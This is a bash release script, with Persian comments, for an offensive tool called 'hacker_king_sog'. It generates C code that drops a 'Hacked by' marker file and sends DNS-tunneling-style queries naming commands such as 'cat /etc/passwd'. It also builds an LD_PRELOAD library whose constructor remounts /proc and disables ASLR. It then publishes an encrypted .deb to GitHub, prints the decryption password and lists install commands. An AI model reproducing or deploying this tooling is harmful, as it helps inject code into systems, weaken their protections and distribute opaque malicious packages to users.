#!/bin/bash

echo "=============================="
echo "  به‌روزرسانی و انتشار نسخه v1.0.4"
echo "=============================="

cd ~/hacker_king_sog

# ۱. ویرایش core.c (قابل اجرا در فضای کاربری)
echo "[*] Updating core.c for user-space execution..."
cat > hacker_king_sog/core.c << 'EOF'
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netdb.h>
#include <time.h>

const char watermark[] = "[ SystemPwn ] Made by Abolfazl Soleimani (C) 2026";

int trigger_payload(const char* target_host) {
    printf("[*] %s\n", watermark);
    printf("[*] Target: %s\n", target_host);
    
    // ۱. ایجاد فایل اثبات روی سیستم محلی
    FILE* flag = fopen("/tmp/.sog_pwn", "w");
    if (flag) {
        fprintf(flag, "Hacked by Abolfazl Soleimani @ %s\n", target_host);
        fclose(flag);
        printf("[+] Proof file created: /tmp/.sog_pwn\n");
    } else {
        printf("[!] Could not create proof file.\n");
    }
    
    // ۲. DNS Tunneling (شبیه‌سازی)
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        printf("[!] Socket creation failed.\n");
        return -1;
    }
    
    struct sockaddr_in dns;
    memset(&dns, 0, sizeof(dns));
    dns.sin_family = AF_INET;
    dns.sin_port = htons(53);
    inet_pton(AF_INET, "8.8.8.8", &dns.sin_addr);
    
    srand(time(NULL));
    const char* chunks[] = {"whoami", "id", "uname -a", "cat /etc/passwd", "ps aux"};
    for (int i = 0; i < 5; i++) {
        char query[256];
        snprintf(query, sizeof(query), "%02x.%s.%d.sog.%s", i, chunks[i], rand() % 999, target_host);
        unsigned char buffer[512];
        int len = snprintf((char*)buffer, sizeof(buffer), "%s", query);
        sendto(sock, buffer, len, 0, (struct sockaddr*)&dns, sizeof(dns));
        usleep(50000 + (rand() % 10000));
    }
    close(sock);
    printf("[+] DNS Tunneling completed.\n");
    
    return 0;
}
EOF

# ۲. اصلاح libfake.c (اضافه کردن هدر)
echo "[*] Fixing libfake.c header..."
cat > hacker_king_sog/libfake.c << 'EOF'
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <dlfcn.h>

__attribute__((constructor)) void init() {
    system("echo 'LD_PRELOAD injection success!' > /tmp/.sog_injected");
    system("mount -o remount,rw /proc 2>/dev/null");
    system("echo 0 > /proc/sys/kernel/randomize_va_space 2>/dev/null");
}

ssize_t write(int fd, const void *buf, size_t count) {
    static ssize_t (*original_write)(int, const void*, size_t) = NULL;
    if (!original_write) {
        original_write = (ssize_t(*)(int, const void*, size_t)) dlsym(RTLD_NEXT, "write");
    }
    return original_write(fd, buf, count);
}
EOF

# ۳. تغییر رمز عبور در 3.sh
echo "[*] Updating password in 3.sh..."
sed -i 's/SuperSecret2026!/Abolfazl_king_sog@/g' 3.sh

# ۴. ساخت بسته جدید
echo "[*] Building new secure package..."
bash 3.sh

# ۵. تغییر شماره نسخه در README و فایل‌ها
echo "[*] Updating version to 1.0.4..."
sed -i 's/1.0.3/1.0.4/g' README.md
sed -i 's/1.0.3/1.0.4/g' setup.py 2>/dev/null || true

# ۶. commit و push به گیت‌هاب
echo "[*] Committing and pushing to GitHub..."
git add .
git commit -m "Release v1.0.4: Fix core.c for user-space, add proof file"
git push origin main

# ۷. ساخت ریلیز جدید
echo "[*] Creating GitHub Release v1.0.4..."
gh release create v1.0.4 \
    --title "hacker_king_sog v1.0.4" \
    --notes "🔑 Password: Abolfazl_king_sog@\n\n✅ Fixed core.c for user-space execution\n✅ Proof file is now created on local system (/tmp/.sog_pwn)\n✅ LD_PRELOAD injection fixed\n\n⚠️ For authorized security testing only." \
    hacker_king_sog_secure.enc \
    hacker_king_sog_secure.enc.sha256

echo "=============================="
echo "✅ انتشار نسخه 1.0.4 با موفقیت انجام شد!"
echo "🔗 لینک ریلیز:"
echo "https://github.com/shanduzgil/hacker_king_sog/releases/tag/v1.0.4"
echo ""
echo "🔑 رمز عبور: Abolfazl_king_sog@"
echo "📌 برای نصب:"
echo "  wget https://github.com/shanduzgil/hacker_king_sog/releases/download/v1.0.4/hacker_king_sog_secure.enc"
echo "  wget https://github.com/shanduzgil/hacker_king_sog/releases/download/v1.0.4/hacker_king_sog_secure.enc.sha256"
echo "  sha256sum -c hacker_king_sog_secure.enc.sha256"
echo "  openssl enc -d -aes-256-cbc -pbkdf2 -in hacker_king_sog_secure.enc -out hacker_king_sog.deb -pass pass:Abolfazl_king_sog@"
echo "  dpkg -i hacker_king_sog.deb"
echo "=============================="
